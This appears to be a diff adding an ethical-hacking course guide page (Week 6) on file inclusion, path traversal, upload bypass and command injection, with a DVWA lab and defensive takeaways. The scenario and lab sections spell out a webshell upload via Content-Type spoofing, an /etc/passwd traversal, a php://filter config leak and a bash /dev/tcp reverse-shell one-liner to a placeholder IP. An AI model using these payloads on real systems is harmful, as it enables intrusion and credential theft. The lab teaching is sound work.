+                <p>The second is that checking the file extension makes uploads safe[cite: 3]. Double extensions,
+                    Content-Type spoofing, and magic-byte spoofing each bypass a name-only check, so defense must also
+                    validate content, disable script execution in the upload directory, and store files outside the web
+                    root[cite: 3].</p>
+                <p>The third is that command injection matters only when output is visible[cite: 3]. Blind injection
+                    still executes the command[cite: 3]. Attackers use time-based detection (for example;sleep 5),
+                    out-of-band DNS or HTTP exfiltration, or a reverse shell that calls back regardless of whether the
+                    page reflects any output[cite: 3].</p>
+
+                <h3>Real-World Breaches</h3>
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Year and product[cite: 3]</th>
+                                <th>Vulnerability[cite: 3]</th>
+                                <th>Impact[cite: 3]</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>2017, Apache Struts[cite: 3]</td>
+                                <td>CVE-2017-5638: crafted Content-Type header triggers OGNL expression during error
+                                    handling; file-upload-related RCE[cite: 3]</td>
+                                <td>Attacker code execution on Struts servers; roughly 147 million US consumer records
+                                    exposed[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>2019 to 2020, Citrix ADC / NetScaler[cite: 3]</td>
+                                <td>CVE-2019-19781: unauthenticated directory traversal wrote a payload under
+                                    /vpns/templates/, which the appliance then executed[cite: 3]</td>
+                                <td>Traversal combined with upload gave full RCE on gateway appliances[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>2018, Drupal[cite: 3]</td>
+                                <td>Drupalgeddon2, CVE-2018-7600: crafted request to a form-upload endpoint reached
+                                    system() through the form rendering pipeline[cite: 3]</td>
+                                <td>Single unauthenticated POST gave RCE; roughly 1 million Drupal sites compromised
+                                    before patching[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>2021, GitLab[cite: 3]</td>
+                                <td>CVE-2021-22205: uploaded image passed to ExifTool; malicious DjVu metadata triggered
+                                    command execution[cite: 3]</td>
+                                <td>Unauthenticated upload path led to RCE on GitLab CE and EE[cite: 3]</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <section id="mod-7" class="content-card section-card" data-section-num="7">
+                <div class="section-card-header">
+                    <div class="sec-num-badge">07</div>
+                    <div class="sec-title-wrap">
+                        <span class="sec-kicker">SCENARIO</span>
+                        <h2 class="section-heading" id="mod-7">Closing Scenario: DVWA Medium Upload and Unsanitized Ping
+                        </h2>
+                    </div>
+                    <a class="anchor-link" href="#mod-7">#</a>
+                </div>
+                <p>The lecture closes with a three-part exercise that chains two vulnerabilities at DVWA Medium
+                    security[cite: 3]. The upload filter checks only the client-supplied Content-Type header, and a
+                    separate Network Diagnostics page runs ping -c 4 with unsanitized input through shell_exec()[cite:
+                    3]. The goal is full RCE with an interactive shell, plus proof that the attacker can manipulate the
+                    upload directory[cite: 3].</p>
+
+                <p>Part (a) asks for the upload bypass[cite: 3]. The model answer uses Burp Repeater to change only the
+                    inner Content-Type of the multipart part to image/jpeg[cite: 3]. The filename and PHP body stay the
+                    same, so the file is stored as shell.php because DVWA Medium trusts the header that PHP populates
+                    from the request[cite: 3].</p>
+
+                <p>Part (b) confirms injection and then escalates[cite: 3]. A payload such as ;id confirms command
+                    execution because the output is reflected[cite: 3]. The reverse shell payload uses bash /dev/tcp
+                    with a netcat listener on port 4444[cite: 3]. The semicolon is preferred over && because the shell
+                    should run even if the ping fails, and the bash /dev/tcp form is preferred over nc -e because
+                    Debian's OpenBSD netcat does not include that flag[cite: 3].</p>
+
+                <p>Part (c) combines the two[cite: 3]. From the www-data shell, the attacker moves into the upload
+                    directory and renames or copies the double-extension file to a clean .php name, creating a
+                    persistent webshell[cite: 3]. The outcome is a cleanly named webshell, an interactive www-data
+                    shell, and write access to the upload directory, which allows further staging such as a Meterpreter
+                    payload[cite: 3]. The chain defeats the Medium MIME check and the unfiltered ping input, then turns
+                    a fragile double-extension file into a durable foothold[cite: 3].</p>
+            </section>
+
+            <section id="mod-8" class="content-card section-card" data-section-num="8">
+                <div class="section-card-header">
+                    <div class="sec-num-badge">08</div>
+                    <div class="sec-title-wrap">
+                        <span class="sec-kicker">LAB & GLOSSARY</span>
+                        <h2 class="section-heading" id="mod-8">Lab Preparation, Glossary and Key Takeaways</h2>
+                    </div>
+                    <a class="anchor-link" href="#mod-8">#</a>
+                </div>
+
+                <h3>Lab Preparation and Assignment</h3>
+                <p>The lab builds directly on the lecture, and every payload on the reference cards is one students will
+                    fire in DVWA[cite: 3]. Preparation starts with setting the DVWA security level in the DVWA Security
+                    tab before each attempt, because the level is held in a session cookie and a stale Low setting makes
+                    a Medium bypass appear to work without proving anything[cite: 3]. Default credentials are admin and
+                    password[cite: 3]. The toolset includes Burp Suite Community (Repeater and Intercept), netcat for
+                    listeners, msfvenom and msfconsole for Meterpreter, and a local Linux shell for crafting
+                    payloads[cite: 3].</p>
+
+                <p>The assignment has three deliverables, each documented with screenshots, the exact payload, and a
+                    one-line outcome statement[cite: 3]:</p>
+                <ol>
+                    <li>First, complete the file upload bypass at all three DVWA levels (Low, Medium, High) and capture
+                        a screenshot of each successful whoami response[cite: 3].</li>
+                    <li>Second, use the resulting webshell to perform one LFI-based file read, either
+                        ../../../../etc/passwd or a php://filter read of config.php that leaks the database
+                        password[cite: 3].</li>
+                    <li>Third, deliver one command-injection reverse shell using bash -i >& /dev/tcp/&lt;yourip&gt;/4444
+                        0>&1 with a netcat listener, either from the diagnostics module or through the webshell[cite:
+                        3]. Submission is due before the next lecture[cite: 3].</li>
+                </ol>
+
+                <div class="exam-checklist-widget">
+                    <div class="chk-header">
+                        <div class="chk-title-group">
+                            <div class="chk-badge">WEEK 6 LAB CHECKLIST</div>
+                            <h3>DVWA Activities</h3>
+                        </div>
+                    </div>
+                    <div class="chk-list">
+                        <div class="checklist-item" id="w6-chk-item-1" onclick="toggleW6Checklist(1)">
+                            <div class="chk-box-wrap"><input id="w6-chk-1" type="checkbox" /></div>
+                            <div class="chk-num">Task 01</div>
+                            <div class="chk-text">
+                                <p>Set DVWA security level in the DVWA Security tab before each attempt[cite: 3].</p>
+                            </div>
+                        </div>
+                        <div class="checklist-item" id="w6-chk-item-2" onclick="toggleW6Checklist(2)">
+                            <div class="chk-box-wrap"><input id="w6-chk-2" type="checkbox" /></div>
+                            <div class="chk-num">Task 02</div>
+                            <div class="chk-text">
+                                <p>Complete the file upload bypass at all three DVWA levels (Low, Medium, High) and
+                                    capture a screenshot of each successful whoami response[cite: 3].</p>
+                            </div>
+                        </div>
+                        <div class="checklist-item" id="w6-chk-item-3" onclick="toggleW6Checklist(3)">
+                            <div class="chk-box-wrap"><input id="w6-chk-3" type="checkbox" /></div>
+                            <div class="chk-num">Task 03</div>
+                            <div class="chk-text">
+                                <p>Use the resulting webshell to perform one LFI-based file read (e.g. php://filter read
+                                    of config.php)[cite: 3].</p>
+                            </div>
+                        </div>
+                        <div class="checklist-item" id="w6-chk-item-4" onclick="toggleW6Checklist(4)">
+                            <div class="chk-box-wrap"><input id="w6-chk-4" type="checkbox" /></div>
+                            <div class="chk-num">Task 04</div>
+                            <div class="chk-text">
+                                <p>Deliver one command-injection reverse shell with a netcat listener, either from the
+                                    diagnostics module or through the webshell[cite: 3].</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>Common pitfalls</h3>
+                <p>Four mistakes recur[cite: 3]. Students forget to set the DVWA security level before a bypass, so a
+                    Low-level result is mistaken for a Medium bypass[cite: 3]. They confuse the Medium Content-Type
+                    spoof, which works because the header is client-controlled, with High, where spoofing the header
+                    alone fails because getimagesize() reads the bytes and magic bytes must be prepended[cite: 3]. They
+                    expect .php.jpg to execute on servers that are not configured for double-extension handling, when
+                    Apache serves the last extension as an image; the fix is to rename through the webshell or use an
+                    .htaccess or AddHandler misconfiguration[cite: 3]. Finally, they forget that allow_url_include is
+                    Off on modern PHP, so RFI payloads fail silently, and the correct move is LFI-to-RCE escalation
+                    through log poisoning, session poisoning, or php://input[cite: 3].</p>
+
+                <h3>Suggested reading</h3>
+                <p>The lecture recommends the OWASP Path Traversal and Command Injection pages, the OWASP Unrestricted
+                    File Upload Cheat Sheet, and the DVWA source at github.com/digininja/DVWA, where students should
+                    read the actual PHP checks for each security level[cite: 3].</p>
+
+                <h3>Glossary</h3>
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Term[cite: 3]</th>
+                                <th>Meaning[cite: 3]</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>LFI[cite: 3]</td>
+                                <td>Local File Inclusion: include-family call with a user-controlled local path[cite: 3]
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>RFI[cite: 3]</td>
+                                <td>Remote File Inclusion: include-family call with a remote URL (requires
+                                    allow_url_include = On)[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>allow_url_include[cite: 3]</td>
+                                <td>PHP setting that lets include-family functions fetch remote URLs; Off by
+                                    default[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>php://filter[cite: 3]</td>
+                                <td>Wrapper that returns a file's source as base64, leaking PHP code without executing
+                                    it[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Path traversal[cite: 3]</td>
+                                <td>Manipulating file path input to escape the intended directory[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Null byte[cite: 3]</td>
+                                <td>%00; older PHP truncates strings at it (file.php%00.jpg)[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Command injection[cite: 3]</td>
+                                <td>User input reaches a shell command unfiltered[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Blind vs active[cite: 3]</td>
+                                <td>No output reflected versus output reflected in the response[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>$IFS[cite: 3]</td>
+                                <td>Shell Internal Field Separator; default whitespace used to bypass space
+                                    filters[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>File upload[cite: 3]</td>
+                                <td>Endpoint that writes user files to disk; leads to RCE if name and content are
+                                    attacker-controlled[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Magic bytes[cite: 3]</td>
+                                <td>Leading bytes identifying a file format (for example GIF89a;); spoofable[cite: 3]
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>getimagesize()[cite: 3]</td>
+                                <td>PHP function that trusts magic bytes, bypassed by prepending a valid image
+                                    header[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Defense in depth[cite: 3]</td>
+                                <td>Stacking independent controls so no single bypass compromises the system[cite: 3]
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3>Key Takeaways</h3>
+                <ul>
+                    <li>P1, LFI and RFI: include-family functions with a user-controlled path[cite: 3].
+                        allow_url_include decides whether the attack is RFI or LFI, and wrappers and poisoning turn LFI
+                        into RCE[cite: 3].</li>
+                    <li>P2, path traversal: escaping the base directory with ../[cite: 3]. Encodings and recursive-strip
+                        bypasses defeat blacklists, so the defense is canonicalize-then-verify[cite: 3].</li>
+                    <li>P3, command injection: operators (;, &&, ||, |, and command substitution) let an attacker append
+                        commands[cite: 3]. Filters are bypassed with $IFS, case and quote tricks, and encoding, and the
+                        attack escalates to a reverse shell[cite: 3].</li>
+                    <li>P4, file upload: DVWA Low has no checks, Medium trusts the Content-Type header, and High checks
+                        the extension and magic bytes[cite: 3]. Bypasses spoof the MIME type, then prepend magic bytes
+                        and use a double extension, and finally rename the file to a clean .php[cite: 3].</li>
+                    <li>P5, defense: apply defense in depth across all four classes[cite: 3]. Avoid dynamic paths and
+                        shell strings, allow-list inputs, canonicalize paths, validate uploads by content, and disable
+                        execution in upload directories[cite: 3].</li>
+                </ul>
+                <p>The durable pattern across all four classes is that untrusted input reaches a sensitive sink, and
+                    naive filters fail because the check and the consumer see different representations of the same
+                    input[cite: 3]. The fixes are structural[cite: 3]. Remove user control over paths and shell strings
+                    where possible, and stack independent controls so that no single bypass leads to compromise[cite:
+                    3].</p>
+
+            </section>
+
+        </main>
+    </div>
+
+    <!-- Modals & Footers -->
+    <div class="search-modal-backdrop" id="searchModal" onclick="if(event.target === this) closeSearchModal()">
+        <div class="search-modal-dialog">
+            <div class="search-modal-header">
+                <svg class="modal-search-icon" viewBox="0 0 24 24" width="20" height="20" stroke="currentColor"
+                    fill="none" stroke-width="2">
+                    <circle cx="11" cy="11" r="8"></circle>
+                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                </svg>
+                <input type="text" id="globalSearchInput" placeholder="Search guide...">
+                <button class="search-modal-close" onclick="closeSearchModal()">ESC</button>
+            </div>
+            <ul class="search-results-list" id="searchResultsList"></ul>
+        </div>
+    </div>
+
+    <footer class="app-footer">
+        <div class="footer-left">
+            <span>🛡️ File Inclusion, Path Traversal, File Upload, Command Injection</span>
+            <span>•</span>
+            <span>CCY4202 Ethical Hacking Week 6</span>
+        </div>
+        <div class="footer-right">
+            <button class="footer-btn" onclick="window.scrollTo({ top: 0, behavior: 'smooth' })">
+                <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" fill="none" stroke-width="2">
+                    <polyline points="18 15 12 9 6 15"></polyline>
+                </svg>
+                <span>Back to Top</span>
+            </button>
+        </div>
+    </footer>
+
+    <script>
+        // Search index data for Week 6
+        const searchData = [
+            { "title": "Local and Remote File Inclusion", "section": "Part 1", "id": "mod-1", "category": "Topic" },
+            { "title": "Path Traversal", "section": "Part 2", "id": "mod-2", "category": "Topic" },
+            { "title": "Command Injection", "section": "Part 3", "id": "mod-3", "category": "Topic" },
+            { "title": "File Upload Vulnerabilities", "section": "Part 4", "id": "mod-4", "category": "Topic" },
+            { "title": "Defensive Coding and Remediation", "section": "Part 5", "id": "mod-5", "category": "Topic" },
+            { "title": "Common Misconceptions and Breaches", "section": "Part 6", "id": "mod-6", "category": "Topic" },
+            { "title": "Closing Scenario", "section": "Scenario", "id": "mod-7", "category": "Topic" },
+            { "title": "Lab Preparation and Glossary", "section": "Lab & Summary", "id": "mod-8", "category": "Topic" }
+        ];
+
+        window.addEventListener('scroll', () => {
+            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const scrolled = (winScroll / height) * 100;
+            document.getElementById('readingProgressBar').style.width = scrolled + '%';
+            updateScrollSpy();
+        });
+
+        function updateScrollSpy() {
+            const sections = document.querySelectorAll('.section-card');
+            let currentId = '';
+            const scrollPos = window.scrollY + 120;
+            sections.forEach(sec => {
+                if (scrollPos >= sec.offsetTop && scrollPos < sec.offsetTop + sec.offsetHeight) currentId = sec.getAttribute('id');
+            });
+            if (currentId) {
+                document.querySelectorAll('.toc-item').forEach(item => {
+                    if (item.getAttribute('data-target') === currentId) item.classList.add('active');
+                    else item.classList.remove('active');
+                });
+            }
+        }
+
+        function toggleTheme() {
+            const html = document.documentElement;
+            const next = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+            html.setAttribute('data-theme', next);
+            localStorage.setItem('pentest_guide_theme', next);
+        }
+        (function initTheme() {
+            const saved = localStorage.getItem('pentest_guide_theme') || 'dark';
+            document.documentElement.setAttribute('data-theme', saved);
+        })();
+
+        function copyCommand(btn) {
+            const terminal = btn.closest('.terminal-card');
+            const cmdText = terminal.querySelector('.terminal-cmd').innerText.trim();
+            navigator.clipboard.writeText(cmdText).then(() => {
+                const orig = btn.innerText;
+                btn.innerText = 'Copied!';
+                setTimeout(() => btn.innerText = orig, 2000);
+            });
+        }
+
+        function toggleMobileMenu() {
+            document.getElementById('sidebarNav').classList.toggle('mobile-open');
+        }
+        function closeMobileMenu() {
+            document.getElementById('sidebarNav').classList.remove('mobile-open');
+        }
+
+        function openSearchModal() {
+            document.getElementById('searchModal').classList.add('open');
+            document.getElementById('globalSearchInput').value = '';
+            renderSearchResults('');
+            setTimeout(() => document.getElementById('globalSearchInput').focus(), 50);
+        }
+        function closeSearchModal() {
+            document.getElementById('searchModal').classList.remove('open');
+        }
+        window.addEventListener('keydown', (e) => {
+            if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); openSearchModal(); }
+            else if (e.key === 'Escape') closeSearchModal();
+        });
+        function renderSearchResults(query) {
+            const list = document.getElementById('searchResultsList');
+            list.innerHTML = '';
+            const q = query.toLowerCase().trim();
+            const matches = searchData.filter(item => !q || item.title.toLowerCase().includes(q)).slice(0, 10);
+            if (matches.length === 0) return list.innerHTML = '<li style="padding: 16px; text-align: center;">No matches</li>';
+            matches.forEach(m => {
+                const li = document.createElement('li');
+                li.innerHTML = `<a href="#${m.id}" class="search-result-item" onclick="closeSearchModal()">
+            <div class="result-main"><span class="result-title">${m.title}</span></div></a>`;
+                list.appendChild(li);
+            });
+        }
+        window.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('globalSearchInput').addEventListener('input', (e) => renderSearchResults(e.target.value));
+        });
+
+        function toggleW6Checklist(num) {
+            const chk = document.getElementById('w6-chk-' + num);
+            if (chk) { chk.checked = !chk.checked; updateW6ChecklistProgress(); }
+        }
+        function updateW6ChecklistProgress() {
+            for (let i = 1; i <= 4; i++) {
+                const chk = document.getElementById('w6-chk-' + i);
+                const item = document.getElementById('w6-chk-item-' + i);
+                if (chk && chk.checked) item.classList.add('checked');
+                else if (item) item.classList.remove('checked');
+            }
+        }
+    </script>
+<!-- home-btn -->
+<style>
+.home-fab,.author-tag{position:fixed;bottom:calc(14px + env(safe-area-inset-bottom));z-index:2000;font-family:system-ui,-apple-system,sans-serif;line-height:1}
+.home-fab{left:calc(14px + env(safe-area-inset-left));display:inline-flex;align-items:center;gap:8px;min-height:44px;padding:0 18px;border-radius:999px;background:#10b981;color:#06251b;font-weight:700;font-size:14px;text-decoration:none;box-shadow:0 6px 18px rgba(0,0,0,.4);-webkit-tap-highlight-color:transparent}
+.home-fab:hover,.home-fab:active{background:#06b6d4}
+.author-tag{right:calc(14px + env(safe-area-inset-right));padding:8px 12px;border-radius:8px;background:rgba(15,23,42,.88);color:#94a3b8;font-weight:600;font-size:12px;max-width:45vw;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;pointer-events:none}
+.author-tag b{color:#10b981}
+@media(max-width:600px){
+.home-fab{width:48px;height:48px;min-height:48px;padding:0;justify-content:center;font-size:22px}
+.home-fab span{display:none}
+.author-tag{font-size:11px;padding:6px 10px;bottom:calc(22px + env(safe-area-inset-bottom))}
+}
+@media print{.home-fab,.author-tag{display:none}}
+</style>
+<a class="home-fab" href="index.html" aria-label="Back to Home">&#8962;<span> Home</span></a>
+<div class="author-tag">Author: <b>Zaneso</b></div>
+<!-- /home-btn -->
+</body>
+
+</html>
